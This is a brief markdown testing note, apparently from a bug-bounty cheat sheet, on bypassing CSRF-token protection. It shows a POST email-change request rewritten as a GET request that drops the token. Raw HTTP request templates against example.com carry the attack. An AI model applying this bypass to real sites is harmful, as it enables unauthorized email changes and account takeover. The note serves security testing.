#                   Test CSRF

## Case 1:
**Whne you see there is protection of CSRF token you can bypass it via GET request.**
```
POST /email/change-email HTTP/1.1
Host: example.com
....


email=bughunter2c@gmail.com&csrf=xyz...
```
_To_
```
GET /email/change-email?email=bughunter2c@gmail.com HTTP/1.1
Host: example.com
...
Xhz...
```
